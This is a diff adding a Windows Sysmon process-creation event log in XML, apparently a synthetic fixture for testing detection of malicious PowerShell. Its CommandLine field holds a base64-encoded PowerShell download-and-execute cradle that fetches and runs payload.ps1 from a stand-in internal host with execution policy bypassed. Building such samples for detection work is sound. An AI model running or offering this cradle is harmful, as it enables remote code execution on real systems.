@@ -1,0 +1,43 @@
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
+    <EventID>1</EventID>
+    <Version>5</Version>
+    <Level>4</Level>
+    <Task>1</Task>
+    <Opcode>0</Opcode>
+    <Keywords>0x8000000000000000</Keywords>
+    <TimeCreated SystemTime="2024-11-15T14:23:40.1234567Z"/>
+    <EventRecordID>987654</EventRecordID>
+    <Correlation/>
+    <Execution ProcessID="4" ThreadID="136"/>
+    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+    <Computer>WORKSTATION-42.corp.local</Computer>
+    <Security UserID="S-1-5-18"/>
+  </System>
+  <EventData>
+    <Data Name="RuleName">-</Data>
+    <Data Name="UtcTime">2024-11-15 14:23:40.123</Data>
+    <Data Name="ProcessGuid">{12345678-abcd-1234-abcd-123456789012}</Data>
+    <Data Name="ProcessId">8844</Data>
+    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="FileVersion">10.0.19041.1 (WinBuild.160101.0800)</Data>
+    <Data Name="Description">Windows PowerShell</Data>
+    <Data Name="Product">Microsoft® Windows® Operating System</Data>
+    <Data Name="Company">Microsoft Corporation</Data>
+    <Data Name="OriginalFileName">PowerShell.EXE</Data>
+    <Data Name="CommandLine">powershell.exe  -NonInteractive -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAiACkA</Data>
+    <Data Name="CurrentDirectory">C:\Users\jsmith\</Data>
+    <Data Name="User">CORP\jsmith</Data>
+    <Data Name="LogonGuid">{ABCDEF12-3456-7890-ABCD-EF1234567890}</Data>
+    <Data Name="LogonId">0x1a2b3c</Data>
+    <Data Name="TerminalSessionId">1</Data>
+    <Data Name="IntegrityLevel">High</Data>
+    <Data Name="Hashes">MD5=A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4,SHA256=A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2,IMPHASH=B1C2D3E4F5A6B1C2D3E4F5A6B1C2D3E4</Data>
+    <Data Name="ParentProcessGuid">{99887766-5544-3322-1100-AABBCCDDEEFF}</Data>
+    <Data Name="ParentProcessId">4532</Data>
+    <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+    <Data Name="ParentCommandLine">cmd.exe /c "powershell -enc ..."</Data>
+    <Data Name="ParentUser">CORP\jsmith</Data>
+  </EventData>
+</Event>
